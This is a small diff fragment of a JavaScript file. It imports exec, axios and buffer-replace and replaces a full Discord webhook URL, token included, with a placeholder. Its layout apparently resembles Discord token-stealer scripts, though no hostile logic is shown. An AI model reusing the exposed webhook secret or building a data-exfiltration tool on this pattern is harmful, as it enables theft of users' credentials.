@@ -197,7 +197,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/945662402450575400/4qZSjOYwulvbJMqksf1egv91fcgmNGZA_MMbzht5oq9Dq2SA8ueslEd__mxRUB_6mXIJ"
+const webhook = "discordass"
 
 
 const config = {
